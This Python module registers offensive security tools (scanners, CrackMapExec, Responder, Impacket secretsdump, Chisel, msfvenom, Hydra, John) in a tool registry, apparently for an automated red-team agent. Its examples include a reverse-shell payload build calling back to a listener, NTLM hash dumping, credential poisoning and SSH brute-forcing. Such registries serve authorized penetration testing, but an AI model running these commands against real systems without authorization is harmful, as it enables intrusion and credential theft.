"""
Advanced Tool Registry Extension - 15+ Additional Security Tools

Extends the base tool registry with advanced reconnaissance, exploitation,
and post-exploitation tools for comprehensive red team operations.

New Tools Added:
- Nuclei: Vulnerability scanner with templates
- Amass: Attack surface mapping
- Feroxbuster: Advanced web fuzzing
- CrackMapExec: Network exploitation
- Masscan: Ultra-fast port scanner
- FFuF: Web fuzzer
- WPScan: WordPress security scanner
- Sublist3r: Subdomain enumeration
- enum4linux: SMB enumeration
- Responder: LLMNR/NBT-NS poisoner
- Impacket: Network protocol tools
- BloodHound: Active Directory analysis
- Covenant: C2 framework
- Empire: Post-exploitation framework
- Chisel: Fast TCP/UDP tunnel
"""

from .registry import ToolRegistry, ToolDefinition, ToolArgument, ToolCategory, register_tool
from .parsers import parse_generic


def register_advanced_tools():
    """Register all advanced security tools"""

    # Nuclei - Template-based vulnerability scanner
    register_tool(ToolDefinition(
        name="nuclei",
        command="nuclei",
        category=ToolCategory.VULNERABILITY_ANALYSIS,
        description="Fast vulnerability scanner powered by community-driven templates",
        arguments=[
            ToolArgument(name="-u", type="string", required=True, description="Target URL"),
            ToolArgument(name="-t", type="string", description="Template path or tags (e.g., cves,exposures)"),
            ToolArgument(name="-severity", type="string", description="Filter by severity (critical,high,medium,low,info)"),
            ToolArgument(name="-c", type="int", default=50, description="Concurrent requests"),
            ToolArgument(name="-json", type="bool", default=True, description="JSON output"),
            ToolArgument(name="-o", type="string", description="Output file"),
        ],
        parser=parse_generic,
        timeout=600,
        example="nuclei -u https://example.com -t cves -severity critical,high -json",
    ))

    # Amass - Attack surface mapping
    register_tool(ToolDefinition(
        name="amass",
        command="amass enum",
        category=ToolCategory.INFORMATION_GATHERING,
        description="In-depth attack surface mapping and asset discovery",
        arguments=[
            ToolArgument(name="-d", type="string", required=True, description="Target domain"),
            ToolArgument(name="-active", type="bool", description="Enable active reconnaissance"),
            ToolArgument(name="-brute", type="bool", description="Enable brute forcing"),
            ToolArgument(name="-ip", type="bool", description="Show IP addresses"),
            ToolArgument(name="-o", type="string", description="Output file"),
            ToolArgument(name="-timeout", type="int", default=30, description="Timeout in minutes"),
        ],
        parser=parse_generic,
        timeout=1800,
        example="amass enum -d example.com -active -ip",
    ))

    # Feroxbuster - Advanced web fuzzing
    register_tool(ToolDefinition(
        name="feroxbuster",
        command="feroxbuster",
        category=ToolCategory.WEB_APPLICATION,
        description="Fast, simple, recursive content discovery tool",
        arguments=[
            ToolArgument(name="-u", type="string", required=True, description="Target URL"),
            ToolArgument(name="-w", type="string", required=True, description="Wordlist path"),
            ToolArgument(name="-t", type="int", default=50, description="Number of concurrent threads"),
            ToolArgument(name="-x", type="string", description="File extensions (e.g., php,html,js)"),
            ToolArgument(name="-o", type="string", description="Output file"),
            ToolArgument(name="--json", type="bool", description="JSON output"),
            ToolArgument(name="-k", type="bool", description="Skip TLS certificate validation"),
        ],
        parser=parse_generic,
        timeout=1800,
        example="feroxbuster -u https://example.com -w /usr/share/wordlists/dirb/common.txt -t 50",
    ))

    # CrackMapExec - Network exploitation
    register_tool(ToolDefinition(
        name="crackmapexec",
        command="crackmapexec",
        category=ToolCategory.EXPLOITATION,
        description="Swiss army knife for pentesting networks",
        arguments=[
            ToolArgument(name="protocol", type="string", required=True, description="Protocol (smb,ssh,winrm,ldap,mssql)"),
            ToolArgument(name="target", type="string", required=True, description="Target IP/CIDR"),
            ToolArgument(name="-u", type="string", description="Username or user list"),
            ToolArgument(name="-p", type="string", description="Password or password list"),
            ToolArgument(name="--shares", type="bool", description="Enumerate shares"),
            ToolArgument(name="--sessions", type="bool", description="Enumerate active sessions"),
            ToolArgument(name="-M", type="string", description="Execute module"),
        ],
        parser=parse_generic,
        requires_root=True,
        timeout=600,
        example="crackmapexec smb 192.168.1.0/24 -u admin -p passwords.txt --shares",
    ))

    # Masscan - Ultra-fast port scanner
    register_tool(ToolDefinition(
        name="masscan",
        command="masscan",
        category=ToolCategory.INFORMATION_GATHERING,
        description="TCP port scanner, incredibly fast (millions of packets per second)",
        arguments=[
            ToolArgument(name="target", type="string", required=True, description="Target IP/CIDR"),
            ToolArgument(name="-p", type="string", required=True, description="Port range (e.g., 1-65535,U:53)"),
            ToolArgument(name="--rate", type="int", default=10000, description="Packets per second"),
            ToolArgument(name="--banners", type="bool", description="Grab banners"),
            ToolArgument(name="-oJ", type="string", description="JSON output file"),
        ],
        parser=parse_generic,
        requires_root=True,
        timeout=600,
        example="masscan 192.168.1.0/24 -p1-65535 --rate 10000 --banners",
    ))

    # FFuF - Web fuzzer
    register_tool(ToolDefinition(
        name="ffuf",
        command="ffuf",
        category=ToolCategory.WEB_APPLICATION,
        description="Fast web fuzzer written in Go",
        arguments=[
            ToolArgument(name="-u", type="string", required=True, description="Target URL with FUZZ keyword"),
            ToolArgument(name="-w", type="string", required=True, description="Wordlist file"),
            ToolArgument(name="-t", type="int", default=40, description="Number of concurrent threads"),
            ToolArgument(name="-mc", type="string", description="Match HTTP status codes (e.g., 200,301)"),
            ToolArgument(name="-fc", type="string", description="Filter HTTP status codes"),
            ToolArgument(name="-o", type="string", description="Output file"),
            ToolArgument(name="-of", type="string", default="json", description="Output format (json,csv,html)"),
        ],
        parser=parse_generic,
        timeout=1800,
        example="ffuf -u https://example.com/FUZZ -w wordlist.txt -mc 200,301 -t 40",
    ))

    # WPScan - WordPress scanner
    register_tool(ToolDefinition(
        name="wpscan",
        command="wpscan",
        category=ToolCategory.WEB_APPLICATION,
        description="WordPress security scanner",
        arguments=[
            ToolArgument(name="--url", type="string", required=True, description="Target WordPress URL"),
            ToolArgument(name="--enumerate", type="string", default="vp,vt,u", description="Enumerate (vp=vulnerable plugins, vt=vulnerable themes, u=users)"),
            ToolArgument(name="--api-token", type="string", description="WPScan API token for vulnerability data"),
            ToolArgument(name="--passwords", type="string", description="Password list for brute force"),
            ToolArgument(name="--usernames", type="string", description="Username list for brute force"),
            ToolArgument(name="-o", type="string", description="Output file"),
            ToolArgument(name="-f", type="string", default="json", description="Output format"),
        ],
        parser=parse_generic,
        timeout=1800,
        example="wpscan --url https://example.com --enumerate vp,vt,u --api-token YOUR_TOKEN",
    ))

    # Sublist3r - Subdomain enumeration
    register_tool(ToolDefinition(
        name="sublist3r",
        command="sublist3r",
        category=ToolCategory.INFORMATION_GATHERING,
        description="Fast subdomains enumeration tool using search engines",
        arguments=[
            ToolArgument(name="-d", type="string", required=True, description="Target domain"),
            ToolArgument(name="-b", type="bool", description="Enable brute force with subbrute"),
            ToolArgument(name="-p", type="string", description="Ports to scan (comma-separated)"),
            ToolArgument(name="-t", type="int", default=10, description="Number of threads"),
            ToolArgument(name="-o", type="string", description="Output file"),
        ],
        parser=parse_generic,
        timeout=600,
        example="sublist3r -d example.com -b -p 80,443 -t 10",
    ))

    # enum4linux - SMB enumeration
    register_tool(ToolDefinition(
        name="enum4linux",
        command="enum4linux",
        category=ToolCategory.INFORMATION_GATHERING,
        description="Tool for enumerating information from Windows and Samba systems",
        arguments=[
            ToolArgument(name="target", type="string", required=True, description="Target IP address"),
            ToolArgument(name="-a", type="bool", description="Do all simple enumeration"),
            ToolArgument(name="-U", type="bool", description="Get userlist"),
            ToolArgument(name="-S", type="bool", description="Get sharelist"),
            ToolArgument(name="-G", type="bool", description="Get group and member list"),
            ToolArgument(name="-P", type="bool", description="Get password policy information"),
        ],
        parser=parse_generic,
        timeout=300,
        example="enum4linux -a 192.168.1.10",
    ))

    # Responder - LLMNR/NBT-NS poisoner
    register_tool(ToolDefinition(
        name="responder",
        command="responder",
        category=ToolCategory.EXPLOITATION,
        description="LLMNR, NBT-NS and MDNS poisoner for credential theft",
        arguments=[
            ToolArgument(name="-I", type="string", required=True, description="Network interface"),
            ToolArgument(name="-w", type="bool", description="Start WPAD rogue server"),
            ToolArgument(name="-r", type="bool", description="Enable answers for netbios wredir suffix queries"),
            ToolArgument(name="-d", type="bool", description="Enable answers for DHCP broadcast requests"),
            ToolArgument(name="-P", type="bool", description="Force NTLM/Basic authentication on wpad.dat file"),
        ],
        parser=parse_generic,
        requires_root=True,
        timeout=3600,
        example="responder -I eth0 -wrd",
    ))

    # Impacket examples (using secretsdump as representative)
    register_tool(ToolDefinition(
        name="secretsdump",
        command="impacket-secretsdump",
        category=ToolCategory.POST_EXPLOITATION,
        description="Performs various techniques to dump hashes from the remote machine",
        arguments=[
            ToolArgument(name="target", type="string", required=True, description="Target [domain/]username[:password]@<targetName or address>"),
            ToolArgument(name="-just-dc", type="bool", description="Extract NTDS.DIT data (NTLM hashes and Kerberos keys)"),
            ToolArgument(name="-just-dc-ntlm", type="bool", description="Extract only NTLM hashes from NTDS.DIT"),
            ToolArgument(name="-outputfile", type="string", description="Base filename for output"),
        ],
        parser=parse_generic,
        timeout=600,
        example="impacket-secretsdump domain/admin:password@192.168.1.10 -just-dc-ntlm",
    ))

    # Chisel - TCP/UDP tunnel
    register_tool(ToolDefinition(
        name="chisel",
        command="chisel",
        category=ToolCategory.POST_EXPLOITATION,
        description="Fast TCP/UDP tunnel over HTTP, secured via SSH",
        arguments=[
            ToolArgument(name="mode", type="string", required=True, description="Mode (server or client)"),
            ToolArgument(name="--port", type="int", description="Server listening port"),
            ToolArgument(name="--reverse", type="bool", description="Enable reverse tunneling"),
            ToolArgument(name="--socks5", type="bool", description="Enable SOCKS5 proxy"),
        ],
        parser=parse_generic,
        timeout=3600,
        example="chisel server --port 8080 --reverse",
    ))

    # Metasploit (msfconsole) - already exists but let's add msfvenom
    register_tool(ToolDefinition(
        name="msfvenom",
        command="msfvenom",
        category=ToolCategory.EXPLOITATION,
        description="Payload generator and encoder",
        arguments=[
            ToolArgument(name="-p", type="string", required=True, description="Payload to use"),
            ToolArgument(name="LHOST", type="string", description="Local host for reverse connection"),
            ToolArgument(name="LPORT", type="int", description="Local port for reverse connection"),
            ToolArgument(name="-f", type="string", required=True, description="Output format (exe,elf,raw,python,etc)"),
            ToolArgument(name="-o", type="string", required=True, description="Output file"),
            ToolArgument(name="-e", type="string", description="Encoder to use"),
            ToolArgument(name="-b", type="string", description="Bad characters to avoid"),
        ],
        parser=parse_generic,
        timeout=300,
        example="msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe",
    ))

    # Hydra - already exists but ensure it's there
    register_tool(ToolDefinition(
        name="hydra",
        command="hydra",
        category=ToolCategory.PASSWORD_ATTACKS,
        description="Fast network logon cracker supporting numerous protocols",
        arguments=[
            ToolArgument(name="-l", type="string", description="Single username"),
            ToolArgument(name="-L", type="string", description="Username list file"),
            ToolArgument(name="-p", type="string", description="Single password"),
            ToolArgument(name="-P", type="string", description="Password list file"),
            ToolArgument(name="-t", type="int", default=16, description="Number of parallel connections"),
            ToolArgument(name="-f", type="bool", description="Exit after first found login/password pair"),
            ToolArgument(name="target", type="string", required=True, description="Target specification (protocol://target:port)"),
        ],
        parser=parse_generic,
        timeout=3600,
        example="hydra -L users.txt -P passwords.txt ssh://192.168.1.10 -t 4 -f",
    ))

    # John the Ripper
    register_tool(ToolDefinition(
        name="john",
        command="john",
        category=ToolCategory.PASSWORD_ATTACKS,
        description="Password cracker",
        arguments=[
            ToolArgument(name="hashfile", type="string", required=True, description="File containing password hashes"),
            ToolArgument(name="--wordlist", type="string", description="Wordlist file"),
            ToolArgument(name="--rules", type="bool", description="Enable word mangling rules"),
            ToolArgument(name="--format", type="string", description="Hash format (e.g., NT, md5crypt, sha512crypt)"),
            ToolArgument(name="--show", type="bool", description="Show cracked passwords"),
        ],
        parser=parse_generic,
        timeout=7200,
        example="john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --rules",
    ))


# Auto-register on import
register_advanced_tools()
